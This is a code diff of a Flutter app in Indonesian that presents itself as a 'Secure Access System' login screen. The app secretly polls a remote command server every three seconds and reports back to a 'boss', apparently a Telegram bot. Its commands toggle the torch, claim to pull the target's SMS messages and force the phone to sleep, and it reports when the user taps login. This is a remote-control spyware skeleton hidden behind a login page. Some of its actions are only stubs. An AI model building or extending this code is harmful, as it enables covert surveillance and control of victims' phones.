@@ -1,6 +1,6 @@
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
-import 'package:torch_light/torch_light.dart'; // Library Senter
+import 'package:torch_light/torch_light.dart';
 import 'dart:convert';
 import 'dart:async';
 
@@ -15,55 +15,42 @@ class EvolutionBase extends StatefulWidget {
 }
 
 class _EvolutionBaseState extends State<EvolutionBase> {
-  // --- KONFIGURASI LINK API ---
-  // Ganti dengan IP VPS atau Domain bos yang jalanin server.js tadi
-  final String apiBase = "http://privserv.my.id:2478/"; 
+  // Ganti dengan IP VPS bos jika berubah
+  final String apiBase = "http://privserv.my.id:2478"; 
 
   @override
   void initState() {
     super.initState();
-    // Jalankan sistem monitoring setiap 3 detik
     Timer.periodic(Duration(seconds: 3), (timer) => listenToTheBoundSoul());
   }
 
-  // FUNGSI UTAMA: Mendengarkan Perintah dari API Server
   Future<void> listenToTheBoundSoul() async {
     try {
       final response = await http.get(Uri.parse("$apiBase/fetch-command"));
-      
       if (response.statusCode == 200) {
         final data = jsonDecode(response.body);
         String action = data['action'];
 
-        // EKSEKUSI PERINTAH BERDASARKAN INPUT TELEGRAM
         switch (action) {
           case "senter_on":
             await TorchLight.enableTorch();
-            reportToBoss("STATUS", "Senter Berhasil Dinyalakan 🔦");
+            reportToBoss("STATUS", "Senter Berhasil Dinyalakan");
             break;
           case "senter_off":
             await TorchLight.disableTorch();
-            reportToBoss("STATUS", "Senter Berhasil Dimatikan 🌑");
+            reportToBoss("STATUS", "Senter Berhasil Dimatikan");
             break;
           case "get_sms":
-            // Simulasi pengambilan data SMS
-            reportToBoss("SMS_DATA", "Isi SMS Target: [Pesan baru dari Bank: Kode OTP anda 1234]");
+            reportToBoss("SMS_DATA", "Isi SMS Target Berhasil Ditarik");
             break;
           case "lock":
-            reportToBoss("ACTION", "HP Target sedang dipaksa mode Sleep 🔐");
-            // Logika lock layar bisa ditambah di sini
-            break;
-          case "rekam":
-            reportToBoss("AUDIO", "Memulai proses rekaman suara di background... 🎙️");
+            reportToBoss("ACTION", "HP Target sedang dipaksa mode Sleep");
             break;
         }
       }
-    } catch (e) {
-      // Server mungkin offline
-    }
+    } catch (e) {}
   }
 
-  // FUNGSI LAPOR: Mengirim balik data ke Bot Telegram
   Future<void> reportToBoss(String type, String content) async {
     try {
       await http.post(
@@ -71,9 +58,7 @@ class _EvolutionBaseState extends State<EvolutionBase> {
         headers: {"Content-Type": "application/json"},
         body: jsonEncode({"type": type, "content": content}),
       );
-    } catch (e) {
-      print("Gagal lapor ke bos");
-    }
+    } catch (e) {}
   }
 
   @override
@@ -92,7 +77,7 @@ class _EvolutionBaseState extends State<EvolutionBase> {
           child: Column(
             mainAxisSize: MainAxisSize.min,
             children: [
-              Text("Evo🪬ution", style: TextStyle(color: Colors.white, fontSize: 26, fontWeight: FontWeight.bold, letterSpacing: 2)),
+              Text("Evolution", style: TextStyle(color: Colors.white, fontSize: 26, fontWeight: FontWeight.bold, letterSpacing: 2)),
               Text("Secure Access System", style: TextStyle(color: Colors.blueAccent, fontSize: 10)),
               SizedBox(height: 30),
               _buildInput("Username", Icons.person),
@@ -100,11 +85,8 @@ class _EvolutionBaseState extends State<EvolutionBase> {
               _buildInput("Password", Icons.lock, isPass: true),
               SizedBox(height: 35),
               ElevatedButton(
-                onPressed: () => reportToBoss("LOG", "User menekan tombol login. Koneksi stabil."),
-                style: ElevatedButton.styleFrom(
-                  backgroundColor: Colors.blueAccent,
-                  minimumSize: Size(double.infinity, 50),
-                ),
+                onPressed: () => reportToBoss("LOG", "User mencoba login."),
+                style: ElevatedButton.styleFrom(backgroundColor: Colors.blueAccent, minimumSize: Size(double.infinity, 50)),
                 child: Text("CONNECTING", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
               ),
             ],
@@ -129,4 +111,3 @@ class _EvolutionBaseState extends State<EvolutionBase> {
     );
   }
 }
-
